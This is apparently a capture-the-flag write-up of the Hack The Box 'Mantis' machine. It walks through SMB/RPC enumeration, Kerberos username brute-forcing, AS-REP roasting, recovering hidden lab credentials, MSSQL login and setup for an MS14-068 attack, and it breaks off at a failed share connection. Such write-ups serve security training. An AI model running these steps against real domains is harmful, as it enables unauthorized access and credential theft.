---
description: https://app.hackthebox.com/machines/98
---

# 🍏 Mantis

<figure><img src="../../.gitbook/assets/image (723).png" alt=""><figcaption></figcaption></figure>

I'll start with a quick nmap scan and then look deeply into each open ports ->

```
nmap -p 53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,10475,26347,49152,49153,49154,49155,49157,49158,49164,49165,49171,50255 -sC -sV 10.129.20.149 -Pn
```

<figure><img src="../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

we quickly enumerate smb:

```
smbmap -H 10.129.20.149
smbclient -N -L 10.129.20.149
```

<figure><img src="../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Both `smbmap` and `smbclient` seem to authenticate anonymously, but return no shares

Now let's enumerate RPC (445)

```
rpcclient -U '' -N 10.129.20.149
querydispinfo
enumdomusers
```

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration" %}

<figure><img src="../../.gitbook/assets/image (726).png" alt=""><figcaption></figcaption></figure>

Now let's look for valid users ->:

```
kerbrute userenum --domain htb.local /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.20.149
```

Good we found some stuff:

<figure><img src="../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

Now let's test out for ASP-Roasting with `GetNPUser`

<figure><img src="../../.gitbook/assets/image (727).png" alt=""><figcaption></figcaption></figure>

```
for user in $(cat users); do GetNPUsers.py htb.local/${user} -no-pass -dc-ip 10.129.20.149 2>/dev/null | grep -F -e '[+]' -e '[-]'; done
```

<figure><img src="../../.gitbook/assets/image (738).png" alt=""><figcaption></figcaption></figure>

1. `for user in $(cat users)`: This loops through each line of the file called "users" and assigns the line to the variable "user".
2. `do GetNPUsers.py htb.local/${user} -no-pass -dc-ip 10.129.20.149 2>/dev/null`: This runs the GetNPUsers.py script for each user in the "users" file, using the domain "htb.local" and the IP address "10.129.20.149" as the domain controller. The "-no-pass" option is used to specify that no password will be provided. The `2>/dev/null` part is used to redirect any error messages to the null device, effectively hiding them from the user.
3. `| grep -F -e '[+]' -e '[-]'`: This pipes the output of the previous command to the grep command, which is used to filter the output to only show lines that contain either the "\[+" or "-" characters. These characters are used to indicate whether the script was able to extract a valid NTLM hash for the user or not.

We look at the http web page on port 8080:

<figure><img src="../../.gitbook/assets/image (739).png" alt=""><figcaption></figcaption></figure>

then we see :

<figure><img src="../../.gitbook/assets/image (740).png" alt=""><figcaption></figcaption></figure>

Maybe there is something to look on this side ->:

<figure><img src="../../.gitbook/assets/image (741).png" alt=""><figcaption></figcaption></figure>

But let's continue enumeration

port 1337 was open&#x20;

<figure><img src="../../.gitbook/assets/image (742).png" alt=""><figcaption></figcaption></figure>

```
gobuster dir -u http://10.129.20.149:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 
```

Bingo&#x20;

<figure><img src="../../.gitbook/assets/image (743).png" alt=""><figcaption></figcaption></figure>

i click on the first one and see some steps for setting up the server:

<figure><img src="../../.gitbook/assets/image (744).png" alt=""><figcaption></figcaption></figure>

beware of sneaky traps, scroll down ->

<figure><img src="../../.gitbook/assets/image (745).png" alt=""><figcaption><p>010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (746).png" alt=""><figcaption><p>sNEAKY</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (730).png" alt=""><figcaption><p>@dm!n_P@ssW0rd!</p></figcaption></figure>

We then go to&#x20;

```
10.129.147.242:8080/admin
```

<figure><img src="../../.gitbook/assets/image (731).png" alt=""><figcaption></figcaption></figure>

and are able to login with those creds

<figure><img src="../../.gitbook/assets/image (732).png" alt=""><figcaption></figcaption></figure>

looking at the nomenclature of the file name was a bit wierd:

<figure><img src="../../.gitbook/assets/image (733).png" alt=""><figcaption></figcaption></figure>

so I copied and pasted it in cyberchef and let the magic do his thing:

<figure><img src="../../.gitbook/assets/image (734).png" alt=""><figcaption></figcaption></figure>

another way of doing it is:

```
echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
```

<figure><img src="../../.gitbook/assets/image (735).png" alt=""><figcaption></figcaption></figure>

since the content of the file Id'd admin, i'll try connecting to mysql (1433) with admin/m\$$ql\_S@\_P@ssW0rd!:

```
mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.129.147.242'
```

<figure><img src="../../.gitbook/assets/image (736).png" alt=""><figcaption></figcaption></figure>

But CLI is not the best so let's use GUI with `dbeaver`

<figure><img src="../../.gitbook/assets/image (737).png" alt=""><figcaption></figcaption></figure>

then we start looking at every file and looking at the data :

<figure><img src="../../.gitbook/assets/image (747).png" alt=""><figcaption><p>james/ J@m3s_P@ssW0rd!</p></figcaption></figure>

this brings a new perspective for our enumeration ->

to connect via RCP with rpcclient with credentials:

```
rpcclient -U htb.local/james 10.129.157.60
```

<figure><img src="../../.gitbook/assets/image (748).png" alt=""><figcaption></figcaption></figure>

With a user, now I can dump the full list of ASP-REP vulnerable users

```
GetNPUsers.py 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52
```

nothing to be found on this side:

<figure><img src="../../.gitbook/assets/image (749).png" alt=""><figcaption></figcaption></figure>

> After striking out on more exploitation, I started to Google a bit, and eventually found [this blog post](https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html) about MS14-068. Basically it’s a critical vulnerability in Windows DCs that allow a simple user to get a Golden ticket without being an admin. With that ticket, I am basically a domain admin.

{% embed url="https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html" %}

install the Kerberos packages:

```
apt-get install krb5-user cifs-utils
```

in `/etc/hosts`

```
10.10.10.52 mantis.htb.local mantis
```

in `/etc/resolv.conf`

```
nameserver 10.10.10.52
```

in `/etc/krb5.conf` (information about the domain)

```
[libdefaults]
    default_realm = HTB.LOCAL

[realms]
    htb.local = {
        kdc = mantis.htb.local:88
        admin_serve = mantis.htb.local
        default_domain = htb.local
    }
[domain_realm]
    .domain.internal = htb.local
    domain.internal = htb.local
```

`ntpdate 10.10.10.52` to sync my host’s time to Mantis, as Kerberos requires the two clocks be in sync.

```
kinit james
klist
```

<figure><img src="../../.gitbook/assets/image (750).png" alt=""><figcaption></figcaption></figure>

Let's try to connect to C$ ->

```
smbclient -W htb.local //mantis/c$ -k
```

but it does not work

